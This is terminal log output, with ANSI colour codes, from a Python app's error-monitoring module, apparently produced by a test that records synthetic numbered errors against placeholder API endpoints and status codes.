WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818868Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2458'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818915Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2459'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2460'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2461'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2462'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819119Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2463'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819213Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2464'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819277Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2465'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2466'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2467'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819493Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2468'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2469'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2470'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2471'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2472'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2473'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2474'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819849Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2475'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819902Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2476'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.819954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2477'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820004Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2478'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820053Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2479'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820104Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2480'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2481'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2482'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820252Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2483'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2484'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820348Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2485'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820398Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2486'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2487'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2488'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820545Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2489'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2490'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820641Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2491'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820689Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2492'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2493'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820786Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2494'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820834Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2495'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2496'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.820929Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2497'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
